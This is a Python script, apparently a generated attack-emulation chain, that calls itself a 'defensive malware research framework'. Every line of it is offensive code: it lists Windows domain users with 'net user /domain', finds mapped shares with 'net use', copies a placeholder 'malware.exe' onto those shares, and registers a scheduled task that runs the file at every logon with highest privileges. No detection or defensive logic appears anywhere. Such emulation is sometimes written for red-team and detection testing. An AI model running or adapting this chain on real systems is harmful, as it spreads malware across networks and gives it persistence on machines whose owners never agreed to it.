#!/usr/bin/env python3
"""Merged modules for a defensive malware research framework."""
import sys
import json
import time
import subprocess
import os
import shutil
from typing import Dict, Any

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Command to list domain users using net command
        command = ["net", "user", "/domain"]
        result = subprocess.run(command, capture_output=True, text=True, timeout=10)
        
        # Parse the output to extract user names
        users = []
        if result.returncode == 0:
            output_lines = result.stdout.splitlines()
            for line in output_lines:
                # Skip lines that are not part of the user list
                if line.startswith("The command completed successfully.") or line.startswith("User accounts for"):
                    continue
                # Split line into user names and add to list
                users.extend(line.split())

        return {'success': True, 'data': {'users': users},
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'users': []},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Command to list shared network drives
        command = ['net', 'use']
        result = subprocess.run(command, capture_output=True, text=True, timeout=10)
        
        # Parse the output to find shared network drives
        shares = []
        if result.returncode == 0:
            for line in result.stdout.splitlines():
                if line.startswith('OK'):
                    parts = line.split()
                    if len(parts) > 2:
                        shares.append(parts[2])  # Assuming the share path is the third element
        else:
            shares = []

        return {'success': True, 'data': {'shares': shares},
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'shares': []}, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        shares = input_data.get('shares', [])
        malware_path = "C:\\path\\to\\malware.exe"  # Example malware path

        # Attempt to copy malware to the first available share
        for share in shares:
            try:
                destination_path = os.path.join(share, os.path.basename(malware_path))
                shutil.copy(malware_path, destination_path)
                result = {'success': True, 'destination_path': destination_path}
                break
            except Exception as e:
                continue
        else:
            # If no shares are available or copy fails, return failure
            result = {'success': False, 'destination_path': ''}

        return {'success': result['success'], 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    task_created = False
    task_name = "MalwareTask"
    
    try:
        # Check if the previous stage was successful
        if input_data.get('success', False):
            destination_path = input_data.get('destination_path', '')
            
            # Create a scheduled task using schtasks
            command = [
                "schtasks", "/create", "/tn", task_name, "/tr", destination_path,
                "/sc", "onlogon", "/rl", "highest"
            ]
            subprocess.run(command, check=True, timeout=10)
            task_created = True
        
        result = {
            "task_created": task_created,
            "task_name": task_name
        }
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
    except Exception as e:
        result = {
            "task_created": task_created,
            "task_name": task_name
        }
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Enumerate Domain Users [discovery] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Enumerate Domain Users): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Enumerate Domain Users): FAILED — {err}')
            failed.append('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T2: Enumerate Shared Network Drives [discovery] ──
    try:
        r = task_T2(None)
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Enumerate Shared Network Drives): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Enumerate Shared Network Drives): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Copy Malware to Remote Share [lateral-movement] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Copy Malware to Remote Share): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Copy Malware to Remote Share): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    # ── T4: Execute Malware via Scheduled Task [persistence] ──
    try:
        r = task_T4(outputs.get('T3', {}))
        results['T4'] = r
        if r.get('success'):
            outputs['T4'] = r.get('data', {})
            print(f'[+] T4 (Execute Malware via Scheduled Task): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T4 (Execute Malware via Scheduled Task): FAILED — {err}')
            failed.append('T4')
    except Exception as e:
        print(f'[!] T4 crashed: {e}')
        failed.append('T4')
        results['T4'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))